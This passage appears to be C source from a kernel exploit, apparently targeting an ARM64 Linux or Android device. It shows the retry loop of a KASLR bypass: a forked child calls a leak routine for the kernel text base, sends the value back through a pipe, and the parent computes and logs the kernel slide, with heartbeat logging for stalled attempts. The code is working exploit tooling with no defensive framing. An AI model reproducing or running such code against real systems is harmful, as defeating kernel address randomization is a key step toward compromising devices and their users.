    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = 0;
    /* Non-blocking wait with child-liveness probes: a silent child means it
     * is stuck before writing (threads never started / futex hang). Log a
     * heartbeat every 10 s so on-device logs show exactly where it stalls. */
    for (;;) {
      struct pollfd pfd = { .fd = fds[0], .events = POLLIN };
      int pret = poll(&pfd, 1, 10000);
      if (pret > 0) {
        n = read(fds[0], &stext, sizeof(stext));
        break;
      }
      if (pret == 0) {
        /* timeout: is the child still alive? */
        char cmdstat[64];
        snprintf(cmdstat, sizeof(cmdstat), "/proc/%d/stat", child);
        struct stat sb;
        int alive = stat(cmdstat, &sb) == 0;
        pr_warning("slide attempt %d still waiting n=%zd child_alive=%d\n",
                   attempt, n, alive);
        continue;
      }
      pr_warning("slide poll error errno=%d\n", errno);
      break;
    }
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));
    if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
        WEXITSTATUS(status) != 0 || !stext) {
      pr_warning("slide attempt %d failed n=%zd status=%d\n",
                 attempt, n, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
